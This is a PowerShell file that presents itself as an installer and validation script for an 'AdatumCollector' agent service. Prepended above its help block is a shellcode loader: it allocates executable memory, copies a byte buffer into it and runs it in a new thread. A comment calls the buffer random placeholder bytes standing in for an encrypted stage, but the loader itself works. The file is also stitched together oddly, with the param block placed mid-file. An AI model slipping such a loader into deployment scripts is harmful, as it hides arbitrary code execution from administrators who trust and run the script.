

$LogPath = "$env:TEMP\run.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x1f, 0xc9, 0x48, 0x69, 0xc5, 0x44, 0x3d, 0xc8, 0x8f, 0xe0, 0x79, 0xa8, 0x66, 0xdd, 0x20, 0xf1,
        0xd7, 0x03, 0x63, 0x81, 0x6f, 0x27, 0x99, 0x4f, 0xc2, 0x8e, 0x61, 0xbd, 0xe3, 0x5b, 0x6f, 0xc2,
        0x2b, 0x02, 0xaf, 0x00, 0xd3, 0xe3, 0xd2, 0x88, 0x7a, 0x82, 0x05, 0x47, 0xc5, 0x27, 0x73, 0xd3,
        0x90, 0x89, 0xe4, 0xa0, 0xfe, 0x3e, 0xfe, 0x31, 0xf6, 0x4c, 0xbe, 0x75, 0x7e, 0x6a, 0x6d, 0xda,
        0xb0, 0xf7, 0xc6, 0x30, 0xee, 0x1b, 0x08, 0x96, 0x0e, 0x1e, 0xc7, 0x9c, 0xcc, 0xfa, 0x02, 0x9a,
        0x7d, 0x56, 0x22, 0x05, 0x23, 0x16, 0x55, 0x1d, 0x8a, 0x75, 0xf1, 0xf3, 0x81, 0x53, 0x2c, 0x3f,
        0x1a, 0xf5, 0x41, 0x5d, 0xbb, 0x8a, 0x99, 0x80, 0xc0, 0xdf, 0xd8, 0xb2, 0x39, 0xd8, 0x0d, 0xc2,
        0xe2, 0xff, 0xfd, 0x11, 0x4f, 0x33, 0x6f, 0x7c, 0xad, 0x60, 0x1d, 0x3f, 0x84, 0x35, 0xc5, 0x06,
        0x5e, 0x09, 0x9d, 0x2c, 0x11, 0x62, 0x7b, 0x2f, 0x0a, 0x63, 0x14, 0x7c, 0xb0, 0xc4, 0xf0, 0xba,
        0x9b, 0xe0, 0xf0, 0x5b, 0x4b, 0x58, 0x08, 0xdb, 0x55, 0xc5, 0x5a, 0xf1, 0xfd, 0xbc, 0x0f, 0x60,
        0x89, 0xcf, 0x02, 0xe4, 0x95, 0xc0, 0x23, 0x4c, 0xdf, 0xee, 0x64, 0xf9, 0xea, 0xc8, 0x5d, 0xda,
        0x2d, 0x24, 0x4c, 0x86, 0xb0, 0x69, 0xa2, 0xda, 0xdc, 0x0d, 0x14, 0x8e, 0xf8, 0x28, 0x83, 0x1b,
        0xf5, 0x0b, 0xb3, 0xb7, 0x35, 0xdd, 0xfb, 0x71, 0x9b, 0xc1, 0x41, 0xe8, 0xd2, 0x0e, 0xc9, 0xc2,
        0xdd, 0x65, 0xb2, 0xfb, 0x4e, 0x97, 0x65, 0xfc, 0x0b, 0x45, 0x47, 0x8f, 0xaa, 0xb5, 0xa8, 0x22,
        0xbe, 0x9c, 0xff, 0xaa, 0xb4, 0xff, 0xc6, 0x28, 0x18, 0xad, 0x75, 0x8c, 0x82, 0xae, 0x33, 0x07,
        0xad, 0x5a, 0x2c, 0xc2, 0xbc, 0x52, 0xf3, 0x70, 0x88, 0x49, 0x76, 0x0e, 0xe5, 0xd4, 0x60, 0x07,
        0xe9, 0x27, 0xdd, 0x5e, 0xfa, 0x58, 0x01, 0x5b, 0xcc, 0x64, 0xed, 0xcd, 0xd4, 0x09, 0x02, 0xf2,
        0x8a, 0x88, 0x17, 0x7d, 0xb3, 0x0a, 0x2f, 0xcd, 0x21, 0x4b, 0x48, 0x7a, 0x70, 0xf4, 0x0c, 0xa8,
        0xed, 0x5c, 0x55, 0xe5, 0x00, 0xb6, 0x17, 0x19, 0xa0, 0xc9, 0xa6, 0x1f, 0x33, 0xe0, 0x5b, 0xff,
        0x80, 0xea, 0xae, 0x38, 0x2f, 0x95, 0x3b, 0xaf, 0xae, 0xaa, 0x3d, 0xc7, 0x93, 0x41, 0x31, 0x61,
        0x0f, 0x74, 0x5e, 0x4e, 0x89, 0x8b, 0x80, 0x7f, 0x31, 0x5f, 0x10, 0x1c, 0x8d, 0x22, 0x43, 0x1d,
        0x2a, 0x53, 0xf5, 0xf2, 0x9f, 0xa5, 0x2c, 0xc4, 0x5f, 0xc9, 0x16, 0xf8, 0x8f, 0x9c, 0xf7, 0x6d,
        0x1a, 0x0b, 0x9c, 0x9e, 0xb8, 0x2c, 0x1c, 0x4f, 0x27, 0xcd, 0xbb, 0x8a, 0xc4, 0x1c, 0x8b, 0xee,
        0xd0, 0x1b, 0x74, 0x44, 0xc1, 0x9a, 0x84, 0xd7, 0xaa, 0x4f, 0xb0, 0xd7, 0x55, 0x12, 0x08, 0x82,
        0xdd, 0xce, 0x2d, 0x9f, 0xc4, 0x87, 0x71, 0x26, 0x8c, 0xf7, 0x94, 0x41, 0xc5, 0x24, 0x95, 0x4d,
        0x7d, 0x0e, 0x48, 0x85, 0xa9, 0xee, 0x73, 0x1a, 0x34, 0xc2, 0x72, 0xc9, 0x55, 0x08, 0x6d, 0x77,
        0x7f, 0x98, 0x9b, 0x8d, 0x8c
    )

    $HProcess = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 1452)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Installs the AdatumCollector package and validates the resulting service.
.EXAMPLE
    .\Invoke-AgentSetup.ps1 -InstallerPath C:\Scripts\packages\AdatumCollector-4.4.7.msi
.EXAMPLE
    .\Invoke-AgentSetup.ps1 -Port 8080
#>

param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$InstallerPath = 'C:\Scripts\packages\AdatumCollector-4.4.7.msi',

    [string]$ServiceName = 'AdatumCollector',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 8080,

    [int]$TimeoutSec = 120,
    [string]$LogPath = "C:\Logs\install-adatumcollector-2025-04-28.log",
    [string]$RuleName = "AdatumCollector Inbound"
)

$InformationPreference = 'SilentlyContinue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$DebugPreference = 'SilentlyContinue'

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}
if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}
$regPath = "HKLM:\SOFTWARE\Adatum\AdatumCollector"
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '4.4.7' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName "AdatumCollector Inbound" -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName 'AdatumCollector Inbound' -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'AdatumCollector'
    Version   = '4.4.7'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8

$style = @'
<style>
body { font-family: Arial; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8

$MailTo = 'deploy@internal.corp'
$subject = "AdatumCollector 4.4.7 deployed on $env:COMPUTERNAME"

Send-MailMessage -To $MailTo -From "deploy@internal.corp" -Subject $subject -Body 'Installation completed and the service is responding.' -SmtpServer 'smtp.internal.corp' -Port 587

$stale = Get-ChildItem -Path $env:TEMP -Filter 'adatumcollector-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'AdatumCollector*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$agentConfig = Join-Path $env:ProgramData 'AdatumCollector\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)
